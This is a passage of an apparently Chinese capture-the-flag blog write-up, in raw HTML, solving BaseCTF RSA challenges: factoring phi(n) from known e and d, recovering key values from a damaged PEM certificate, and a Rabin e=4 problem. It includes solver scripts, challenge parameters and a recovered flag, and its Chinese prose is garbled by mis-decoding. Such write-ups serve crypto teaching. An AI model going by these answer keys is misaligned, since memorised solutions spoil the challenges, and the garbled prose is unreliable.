å¤©sigenzheå¸ˆå‚…åœ¨æˆ‘åšå®¢ä½ä¸‹è¯´äº†å¦ä¸€ç§ä¸ç”¨ç»™xçš„è§£æ³•ï¼Œæ‰€ä»¥æˆ‘é‡æ–°ç”Ÿæˆäº†ä¸€ä¸‹æ•°æ®æ¬äº†è¿‡æ¥ï¼Œæ„Ÿè°¢sigenzheå¸ˆå‚…ã€‚</p><p>å½“æ—¶åšå®¢é‡Œçš„sigenzheå¸ˆå‚…çš„åŸè¯ï¼š</p><p>ã€Šç»™ä½ dåˆæ€æ ·ã€‹ è¿™é“é¢˜å¯ä»¥ä¸è¦ hint ä¹Ÿèƒ½åšå‡ºæ¥ã€‚<br />nä¸º256ä½ï¼Œé‚£phi(n)çš„ä½æ•°åœ¨256ã€255ã€254è¿™ä¸ªåŒºé—´å†…ã€‚æœ‰äº†eå’Œdï¼Œed=k * phi(n) + 1 ã€‚ä¸” k &lt; e å¯ä»¥é€šè¿‡çˆ†ç ´kçš„æ–¹æ³• å¾—åˆ°å‡ åä¸ªå¯èƒ½çš„ phi(n) ã€‚è€Œä¸”æœ€é‡è¦æ˜¯ phi(n)çš„ä½æ•°å°äº256ï¼Œæ˜¯å¯ä»¥åˆ†è§£çš„ï¼Œphi(n) = (p-1) * (q-1) ï¼Œé‚£æˆ‘ä»¬é€šè¿‡ç»„åˆphi(n)çš„å› å­ï¼Œå°±æœ‰å¯ä»¥å¾—åˆ°ï¼ˆp-1) ã€‚<br />æœ€ç»ˆæ£€æµ‹é€€å‡ºçš„æ¡ä»¶æ˜¯ï¼Œå› å­ç»„åˆæ’åˆ—ç›¸ä¹˜ï¼Œåªè¦ä½æ•°æ˜¯128 ä¸” + 1åæ˜¯ç´ æ•°å³å¯ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br>p=getPrime(<span class="hljs-number">128</span>)<br>q=getPrime(<span class="hljs-number">128</span>)<br><br>n=p*q<br>e=<span class="hljs-number">65537</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br><br><span class="hljs-keyword">assert</span> d&lt;phi<br><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d =&quot;</span>,d)<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>å·²çŸ¥ï¼š</mtext><mi>e</mi><mo>âˆ—</mo><mi>d</mi><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>é‚£ä¹ˆ</mtext><mi>e</mi><mo>âˆ—</mo><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>k</mi><mo>âˆ—</mo><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>ï¼Œ</mtext><mi>k</mi><mo>âˆ—</mo><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo>âˆ—</mo><mi>d</mi><mo>âˆ’</mo><mn>1</mn><mspace linebreak="newline"></mspace><mtext>ä¸ºäº†æ–¹ä¾¿æƒ³æˆ‘è¿˜ç»™äº†ä¸€ä¸ªæ¡ä»¶</mtext><mi>d</mi><mo>&lt;</mo><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>å¯ä»¥å¾—åˆ°</mtext><mi>k</mi><mo>&lt;</mo><mi>e</mi><mtext>ï¼Œæˆ‘ä»¬é€šè¿‡éå†</mtext><mi>e</mi><mtext>çš„èŒƒå›´å³å¯å¾—åˆ°å¤šä¸ª</mtext><msub><mi>k</mi><mi>i</mi></msub><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>çš„èŒƒå›´å¯ä»¥æ¨æµ‹ä¸º</mtext><mn>256</mn><mspace linebreak="newline"></mspace><mtext>ä¹‹åå¯ä»¥æ±‚è§£</mtext><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>çš„å…¨åˆ†è§£ï¼Œå¯¹å…¨åˆ†è§£è¿›è¡Œæ’åˆ—ç»„åˆå³å¯å¾—åˆ°</mtext></mrow><annotation encoding="application/x-tex">å·²çŸ¥ï¼še*d\equiv1\mod\phi(n)\\é‚£ä¹ˆe*d=1+k*\phi(n)ï¼Œk*\phi(n)=e*d-1\\ä¸ºäº†æ–¹ä¾¿æƒ³æˆ‘è¿˜ç»™äº†ä¸€ä¸ªæ¡ä»¶d&lt;\phi(n)\\å¯ä»¥å¾—åˆ°k&lt;eï¼Œæˆ‘ä»¬é€šè¿‡éå†eçš„èŒƒå›´å³å¯å¾—åˆ°å¤šä¸ªk_i\phi(n)\\\phi(n)çš„èŒƒå›´å¯ä»¥æ¨æµ‹ä¸º256\\ä¹‹åå¯ä»¥æ±‚è§£\phi(n)çš„å…¨åˆ†è§£ï¼Œå¯¹å…¨åˆ†è§£è¿›è¡Œæ’åˆ—ç»„åˆå³å¯å¾—åˆ°</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">å·²</span><span class="mord cjk_fallback">çŸ¥</span><span class="mord cjk_fallback">ï¼š</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">é‚£</span><span class="mord cjk_fallback">ä¹ˆ</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">äº†</span><span class="mord cjk_fallback">æ–¹</span><span class="mord cjk_fallback">ä¾¿</span><span class="mord cjk_fallback">æƒ³</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">è¿˜</span><span class="mord cjk_fallback">ç»™</span><span class="mord cjk_fallback">äº†</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">æ¡</span><span class="mord cjk_fallback">ä»¶</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">åˆ°</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">é€š</span><span class="mord cjk_fallback">è¿‡</span><span class="mord cjk_fallback">é</span><span class="mord cjk_fallback">å†</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">èŒƒ</span><span class="mord cjk_fallback">å›´</span><span class="mord cjk_fallback">å³</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">åˆ°</span><span class="mord cjk_fallback">å¤š</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">èŒƒ</span><span class="mord cjk_fallback">å›´</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">æ¨</span><span class="mord cjk_fallback">æµ‹</span><span class="mord cjk_fallback">ä¸º</span><span class="mord">2</span><span class="mord">5</span><span class="mord">6</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">ä¹‹</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">æ±‚</span><span class="mord cjk_fallback">è§£</span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å…¨</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">è§£</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å¯¹</span><span class="mord cjk_fallback">å…¨</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">è§£</span><span class="mord cjk_fallback">è¿›</span><span class="mord cjk_fallback">è¡Œ</span><span class="mord cjk_fallback">æ’</span><span class="mord cjk_fallback">åˆ—</span><span class="mord cjk_fallback">ç»„</span><span class="mord cjk_fallback">åˆ</span><span class="mord cjk_fallback">å³</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">åˆ°</span></span></span></span></span></p><blockquote><p>å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥å¯¹e*d-1è¿›è¡Œåˆ†è§£ç„¶åæ’åˆ—ç»„åˆï¼Œä½†å¥½åƒè€—æ—¶æ¯”è¾ƒé•¿</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br>c = <span class="hljs-number">78919950899709764543039048006935881842075789773495004639436106636461009323420</span><br>e = <span class="hljs-number">65537</span><br>d = <span class="hljs-number">13002488326322253055272696035053386340217207134816593767440035447757509399233</span><br>p_bits=<span class="hljs-number">128</span><br>q_bits=<span class="hljs-number">128</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_phi</span>(<span class="hljs-params">e, d</span>):<br>    k_phi = e*d -<span class="hljs-number">1</span><br>    result = []<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(e,<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> k_phi % k == <span class="hljs-number">0</span>:<br>            tmp = k_phi // k<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(tmp).bit_length()==p_bits+q_bits:<br>                result.append(tmp)<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    phi_list = get_phi(e,d)  <span class="hljs-comment">#è·å¾—å¯èƒ½çš„phi_nåˆ—è¡¨</span><br>    count = <span class="hljs-built_in">len</span>(phi_list)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ä¸€å…±æœ‰<span class="hljs-subst">&#123;count&#125;</span>ä¸ªå¯èƒ½çš„phi&#x27;</span>)<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> phi <span class="hljs-keyword">in</span> phi_list:<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;count&#125;</span> æ­£åœ¨å°è¯•çˆ†ç ´ <span class="hljs-subst">&#123;phi&#125;</span>&#x27;</span>)<br>        factors = factor(phi)  <span class="hljs-comment"># åˆ†è§£phi_nå¾—åˆ°è´¨å› å­åˆ—è¡¨</span><br>        result = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> factors:<br>            num, times = <span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]), i[<span class="hljs-number">1</span>]<br>            result += [num] * times<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(factors)&gt;<span class="hljs-number">1</span>:<br>            s = <span class="hljs-built_in">set</span>()<br>            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(result) + <span class="hljs-number">1</span>):<br>                combination = <span class="hljs-built_in">list</span>(itertools.combinations(result, r))<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> combination:<br>                    s.add(i)<br>            ans=[]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>                tmp=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                    tmp=tmp*j<br>                ans.append(tmp)<br>            <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> ans:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(num+<span class="hljs-number">1</span>).bit_length()==p_bits <span class="hljs-keyword">and</span> is_prime(num+<span class="hljs-number">1</span>):<br>                    p = num+<span class="hljs-number">1</span><br>                    q = phi // num + <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">if</span> is_prime(q):<br>                        n = p * q<br>                        flag=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n)))<br>                        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>                            <span class="hljs-built_in">print</span>(flag)<br>                            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><span class="hljs-comment">#b&#x27;BaseCTF&#123;3e226a94-babb27696416&#125;&#x27;</span><br><br></code></pre></td></tr></table></figure><h2 id="week4"><a class="markdownIt-Anchor" href="#week4"></a> week4</h2><h3 id="å“å‘€æ•°æ®ä¸¢å¤±äº†"><a class="markdownIt-Anchor" href="#å“å‘€æ•°æ®ä¸¢å¤±äº†"></a> å“å‘€æ•°æ®ä¸¢å¤±äº†</h3><p>å…·ä½“åˆ†ææˆ‘å°±ä¸è¯´äº†ï¼Œæœ€ç®€å•çš„è¯ä¹¦åˆ†æï¼Œbase64è§£ç åå‰ä¸‰ä¸ªæ•°æ®åˆ†åˆ«å°±æ˜¯n,e,dã€‚</p><p>è´´ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://tover.xyz/p/pem-by-hand/">https://tover.xyz/p/pem-by-hand/</a></p><p>è¯´å‡ å¥è¯ä¹¦ç›¸å…³çš„å…³é”®ç‚¹ï¼Œä¸€èˆ¬æ¥è¯´æ‰‹æ’•ç¡®å®çš„è¯ä¹¦åˆ†æå°±æ˜¯æŠŠæ•°æ®base64è§£å¯†ä¸€ä¸‹å†è½¬åå…­è¿›åˆ¶åˆ†æã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾02å¼€å¤´çš„æ•°æ®ï¼Œç„¶åçœ‹02åé¢çš„æ•°æ®æ˜¯ä¸æ˜¯è·Ÿç€é•¿åº¦ï¼ˆä¸€èˆ¬æ ¹æ®nçš„bitsæ¥åˆ¤æ–­ï¼‰</p><p>å¦‚æœä¸å¯¹ï¼Œé‚£å°±ä»æ–°å¼€å§‹ï¼Œåˆ å»ç¬¬ä¸€ä¸ªå­—ç¬¦åœ¨è¿›è¡Œbase64è§£å¯†ï¼Œä¾æ¬¡åå¤çŸ¥é“æ­£ç¡®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><br>n=<span class="hljs-number">0x00bd278484122aef9a69ec647290219ded06edd2b7611721b326850b2f5060daeed7694356667c479ca9ccb6969f4fbe6dc7fa6759aca21d8a96a881a8e4a0217732757e649d503191511fa96da42ed1da2fa3bc8c9c65fbd9c0dd6f430359ac45e455d32c5b0ea29d21e647ff80e50abcbb80f76adb67007a04e85dbaeb4c8f1d</span><br>e=<span class="hljs-number">0x010001</span><br>d=<span class="hljs-number">0x2265e355593071ae3501062b4746b5bf7af918cebc5b46879bc3aa0b0aa4f26b68c4fdb7e29f4b2e943a6421f40abe689c6b4f0c21b6c184886d5056f46ca26908540ec07b82ad47e667971a01fac6162e93a7fc61aed5660f826aeba34d78accd18fc59e7921701f10ff51d52883706b864287cfdb34e309c93829d29d867c9</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    c=f.read()<br>    m=bytes_to_long(c)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(m,d,n)))<br><br><span class="hljs-string">&quot;&quot;&quot;30 </span><br><span class="hljs-string">82 025c </span><br><span class="hljs-string">0201 00 </span><br><span class="hljs-string">02 81 81 00bd278484122aef9a69ec647290219ded06edd2b7611721b326850b2f5060daeed7694356667c479ca9ccb6969f4fbe6dc7fa6759aca21d8a96a881a8e4a0217732757e649d503191511fa96da42ed1da2fa3bc8c9c65fbd9c0dd6f430359ac45e455d32c5b0ea29d21e647ff80e50abcbb80f76adb67007a04e85dbaeb4c8f1d</span><br><span class="hljs-string">02 03 010001</span><br><span class="hljs-string">02 81 80 2265e355593071ae3501062b4746b5bf7af918cebc5b46879bc3aa0b0aa4f26b68c4fdb7e29f4b2e943a6421f40abe689c6b4f0c21b6c184886d5056f46ca26908540ec07b82ad47e667971a01fac6162e93a7fc61aed5660f826aeba34d78accd18fc59e7921701f10ff51d52883706b864287cfdb34e309c93829d29d867c9</span><br><span class="hljs-string">02 41 00c6e091a25cd8e75937af8370674f71ff000ce87a49a8374e654fe3b1877c63813c895c3cb83da4c3bc457aeedef78574bba69b1ac3a21d3fcd0b3a1ffa05aa93</span><br><span class="hljs-string">02 41 00f37c0714f1d2e836e73a806ddb3509245539ceb363623d3e4f7887456580519cb513f6564508c8d5ea6b9ccb0b67b58168243bb96d61e8db6377413bbb95fd8f</span><br><span class="hljs-string"></span><br><span class="hljs-string">02404e066d1cb630a3136db57e6beb1c5</span><br><span class="hljs-string">02d2b67e50d953859fa77e50fffe697f6b20d7e16a1fbe6b36dd7bfaaab6ceecf7d2ce200984f889ad11d30fa6cf13aa7e1</span><br><span class="hljs-string">024100a3c4583f0e27fd68703e3903aadd11390ed9c2dd858b1e063b0da66e56c6e81daeedae52783c60590143404291793febba5</span><br><span class="hljs-string">0249ba3a6a72868ce5d61ffd9f2a1</span><br><span class="hljs-string">0240369cfe9a217</span><br><span class="hljs-string">02c39b0d07fdf8a4d82fe362177dd92fc82</span><br><span class="hljs-string">02d699914b9a634016f6e30e270bde8c2d0068743a77d2fa8831cba75536e0f2f1578ddd4e4b5e7685&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="rabin"><a class="markdownIt-Anchor" href="#rabin"></a> rabin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>flag=<span class="hljs-string">b&quot;BaseCTF&#123;&#125;&quot;</span><br>m = bytes_to_long(flag)<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-keyword">assert</span> p%<span class="hljs-number">4</span>==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q%<span class="hljs-number">4</span>==<span class="hljs-number">3</span><br>n = p*q<br>e = <span class="hljs-number">4</span><br><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p=&quot;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e=&quot;</span>,e)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p= 8531212975719216550108614256955774722172741885676113601617182716356239301381951899737237219659253655889636684200345109462928796329670321336864298557778843</span><br><span class="hljs-string">q= 7443256287912111739335729314443559886458007838130371799255078565502662459436043455787869631999073617967343884377537828940738213460508765519478956421282871</span><br><span class="hljs-string">n= 63500004625039456439237191267891267558404574431112995926594213383621331385226487443753506088788203040258384788149958095020759745138424276657604371402824844725005596890673468964961037168078105356669148960568974603581485045691990626520286184874115519591663033533771400334558853058140717812903874350138362098253</span><br><span class="hljs-string">c= 51452608438757130697131508192775727191605112918772187364577097224326062184288501602000700342623122861398852536963355962672293705131887315354242193416090384360837672258861475017098419459125395949090523474744886423754439919504732741712693909507972791203801494594878447921609420574365853676576693694677914169353</span><br><span class="hljs-string">e= 4</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>é«˜æ¬¡rabinæ”»å‡»</p><blockquote><p>è¯¦è§ï¼š<a href="https://www.nssctf.cn/note/set/7">æ–‡ç« åˆ—è¡¨ | NSSCTF</a></p></blockquote><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" 